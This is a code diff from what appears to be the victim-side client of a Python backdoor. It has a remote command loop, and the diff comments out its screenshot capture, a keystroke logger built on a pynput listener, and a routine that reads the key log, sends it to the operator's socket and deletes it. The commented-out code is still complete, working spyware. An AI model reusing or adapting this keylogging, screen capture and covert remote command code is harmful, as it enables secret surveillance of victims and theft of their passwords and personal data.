@@ -39,23 +39,23 @@ class Victim:
                     self.send_result(self.victimSocket, "Failed to switch directory.".encode())
                     continue
             # 截图
-            elif commlist[0] == 'screenshot':
-                screenshot_time = self.capture_screenshot(commlist[1])
-                time_result = str(screenshot_time)
-                self.send_result(self.victimSocket, time_result.encode())
-                continue
+            # elif commlist[0] == 'screenshot':
+            #     screenshot_time = self.capture_screenshot(commlist[1])
+            #     time_result = str(screenshot_time)
+            #     self.send_result(self.victimSocket, time_result.encode())
+            #     continue
             # 存储型键盘记录器
-            elif command == "Stored Keystroke logging":
-                try:
-                    keyboard = stored_keyboard(self.victimSocket)
-                    command_keyboard = "type key_log.txt && DEL key_log.txt && exit"
-                    result = subprocess.check_output(command_keyboard, shell=True)
-                    self.send_result(self.victimSocket, result)
-                    continue
-                except:
-                    quit_err = '\033[1;31;31m' + "[!] Keystroke logging ended." + '\033[0m'
-                    self.send_result(self.victimSocket, quit_err.encode())
-                    continue
+            # elif command == "Stored Keystroke logging":
+            #     try:
+            #         keyboard = stored_keyboard(self.victimSocket)
+            #         command_keyboard = "type key_log.txt && DEL key_log.txt && exit"
+            #         result = subprocess.check_output(command_keyboard, shell=True)
+            #         self.send_result(self.victimSocket, result)
+            #         continue
+            #     except:
+            #         quit_err = '\033[1;31;31m' + "[!] Keystroke logging ended." + '\033[0m'
+            #         self.send_result(self.victimSocket, quit_err.encode())
+            #         continue
             else:
                 try:
                     # 防止某些命令执行后没有结果传输，导致后门无法正常工作的情况发生
@@ -143,14 +143,14 @@ class Victim:
                 break
 
     # 截图函数
-    def capture_screenshot(self, filename):
-        beg = time.time()
-        # 截取全屏
-        screenshot = ImageGrab.grab()
-        # 保存到指定的文件
-        screenshot.save(filename)
-        end = time.time()
-        return (end - beg)
+    # def capture_screenshot(self, filename):
+    #     beg = time.time()
+    #     # 截取全屏
+    #     screenshot = ImageGrab.grab()
+    #     # 保存到指定的文件
+    #     screenshot.save(filename)
+    #     end = time.time()
+    #     return (end - beg)
 
     # 信息发送函数
     def send_result(self, victimSocket, result):
@@ -163,30 +163,30 @@ class Victim:
 
 
 # 实时键盘记录器类
-class stored_keyboard:
-    def __init__(self, victimSocket):
-        self.victimSocket = victimSocket
-        # 定义一个日志文件名
-        self.log_file = "key_log.txt"
-        # 创建一个键盘监听器
-        with Listener(on_press=self.on_press) as listener:
-            # 启动监听器
-            listener.join()
-
-    # 定义一个按键处理函数
-    def on_press(self, key):
-        # 打开日志文件，追加模式
-        with open(self.log_file, "a", encoding="utf-8") as f:
-            # 判断按键是否是特殊键，如空格、回车、Esc等
-            if isinstance(key, Key):
-                # 写入按键的名称，加一个空格
-                f.write(key.name + " ")
-                # 如果按下了Esc键，退出监听
-                if key == Key.esc:
-                    return False
-            else:
-                # 否则，写入按键的字符值，不加空格
-                f.write(key.char)
+# class stored_keyboard:
+#     def __init__(self, victimSocket):
+#         self.victimSocket = victimSocket
+#         # 定义一个日志文件名
+#         self.log_file = "key_log.txt"
+#         # 创建一个键盘监听器
+#         with Listener(on_press=self.on_press) as listener:
+#             # 启动监听器
+#             listener.join()
+#
+#     # 定义一个按键处理函数
+#     def on_press(self, key):
+#         # 打开日志文件，追加模式
+#         with open(self.log_file, "a", encoding="utf-8") as f:
+#             # 判断按键是否是特殊键，如空格、回车、Esc等
+#             if isinstance(key, Key):
+#                 # 写入按键的名称，加一个空格
+#                 f.write(key.name + " ")
+#                 # 如果按下了Esc键，退出监听
+#                 if key == Key.esc:
+#                     return False
+#             else:
+#                 # 否则，写入按键的字符值，不加空格
+#                 f.write(key.char)
 
 
 if __name__ == '__main__':
